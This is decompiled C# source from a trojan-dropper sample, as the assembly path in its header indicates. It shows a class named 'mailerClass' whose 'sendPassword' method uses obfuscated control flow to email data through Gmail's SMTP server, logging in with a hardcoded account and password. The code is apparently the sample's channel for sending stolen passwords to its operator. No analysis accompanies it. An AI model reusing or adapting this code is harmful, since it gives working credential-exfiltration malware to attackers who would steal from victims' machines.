// Decompiled with JetBrains decompiler
// Type: AltiumManager.mailerClass
// Assembly: NtRFufHofqVzZAe, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A3465D-1BFC-53F3-99D7-B93CF53E7ECD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-3a2a9cfdbd61a0059dfc842bf5333d9548d205d7c6313ef12be7840df044fc87.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace AltiumManager
{
  public class mailerClass
  {
    private MailMessage mail;

    public mailerClass() => this.mail = new MailMessage();

    public void sendPassword(string tempAddress, string tempSubject, string tempBody)
    {
label_2:
      int num1 = 7;
      SmtpClient smtpClient;
      while (true)
      {
        switch (num1 ^ 153)
        {
          case 150:
            num1 = 0;
            continue;
          case 151:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (mailerClass.\u002Ector);
            num1 = 14;
            continue;
          case 152:
            num1 = 4;
            continue;
          case 153:
            smtpClient.Port = 587;
            num1 = 3;
            continue;
          case 154:
            num1 = 2;
            continue;
          case 155:
            smtpClient.Host = "smtp.gmail.com";
            num1 = 1;
            continue;
          case 156:
            smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential("checkcorpaltiummanager@gmail.com", "checkPass00");
            num1 = 15;
            continue;
          case 157:
            smtpClient.EnableSsl = true;
            num1 = 6;
            continue;
          case 158:
            smtpClient = new SmtpClient();
            num1 = 5;
            continue;
          case 159:
            num1 = 57;
            continue;
          case 160:
            goto label_14;
          default:
            goto label_2;
        }
      }
label_14:
      this.mail = new MailMessage();
      try
      {
        this.mail.From = new MailAddress("checkcorpaltiummanager@gmail.com", "Altium Admin", Encoding.UTF8);
label_17:
        int num2 = 11;
        while (true)
        {
          switch (num2 ^ 145)
          {
            case 143:
              num2 = 10;
              continue;
            case 144:
              num2 = 4;
              continue;
            case 145:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (mailerClass.sendPassword);
              num2 = 0;
              continue;
            case 146:
              num2 = 7;
              continue;
            case 147:
              this.mail.ReplyToList.Add(tempAddress);
              num2 = 13;
              continue;
            case 148:
              num2 = 12;
              continue;
            case 149:
              this.mail.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
              num2 = 6;
              continue;
            case 150:
              this.mail.Subject = tempSubject;
              num2 = 30;
              continue;
            case 151:
              num2 = 2;
              continue;
            case 152:
              this.mail.To.Add(tempAddress);
              num2 = 3;
              continue;
            case 153:
              smtpClient.Send(this.mail);
              num2 = 5;
              continue;
            case 154:
              num2 = 9;
              continue;
            case 155:
              this.mail.Body = tempBody;
              num2 = 1;
              continue;
            case 156:
              num2 = 8;
              continue;
            case 157:
              goto label_9;
            default:
              goto label_17;
          }
        }
label_9:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num3 = (int) Interaction.MsgBox((object) ex.ToString());
        ProjectData.ClearProjectError();
      }
    }
  }
}
